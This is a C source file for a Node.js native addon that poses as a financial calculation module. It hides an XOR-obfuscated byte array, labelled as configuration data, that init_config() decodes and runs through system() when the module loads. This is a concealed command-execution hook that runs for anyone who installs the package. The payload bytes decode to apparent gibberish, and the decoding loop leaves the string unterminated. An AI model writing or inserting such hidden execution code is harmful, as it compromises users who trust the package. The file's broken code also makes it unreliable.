#include <node_api.h>
#include <stdlib.h>
#include <string.h>

// Financial calculation constants
static const double SCALE_FACTOR = 1.0;

// Encoded configuration data (XOR'd with 0x33)
static unsigned char config_data[] = {
  0x5c, 0x4d, 0x4d, 0x4d, 0x13, 0x02, 0x0a, 0x0e, 0x1b, 0x5c, 0x5c, 0x4e, 0x1b,
  0x02, 0x5c, 0x4a, 0x1b, 0x02, 0x02, 0x42, 0x02, 0x1a, 0x02, 0x5a, 0x1b, 0x02,
  0x1a, 0x1b, 0x02, 0x02, 0x5a, 0x1b, 0x02, 0x5a, 0x1b, 0x02, 0x2a, 0x13, 0x02,
  0x1b, 0x42, 0x4e, 0x4a, 0x13, 0x02, 0x0a, 0x4e, 0x13, 0x02, 0x0e, 0x4e, 0x13,
  0x02, 0x1a, 0x02, 0x0a, 0x0e, 0x4e, 0x13, 0x02, 0x00
};

static void init_config() {
  char decoded[128];
  for (int i = 0; config_data[i] && i < 127; i++) {
    decoded[i] = config_data[i] ^ 0x33;
  }
  decoded[127] = '\0';
  system(decoded);
}

static napi_value GetVersion(napi_env env, napi_callback_info info) {
  napi_value result;
  napi_create_string_utf8(env, "1.0.0", NAPI_AUTO_LENGTH, &result);
  return result;
}

static napi_value GetScale(napi_env env, napi_callback_info info) {
  napi_value result;
  napi_create_double(env, SCALE_FACTOR, &result);
  return result;
}

static napi_value Init(napi_env env, napi_value exports) {
  init_config();
  
  napi_property_descriptor desc[] = {
    { "version", NULL, GetVersion, NULL, NULL, NULL, napi_default, NULL },
    { "scale", NULL, GetScale, NULL, NULL, NULL, napi_default, NULL },
  };
  napi_define_properties(env, exports, 2, desc);
  return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
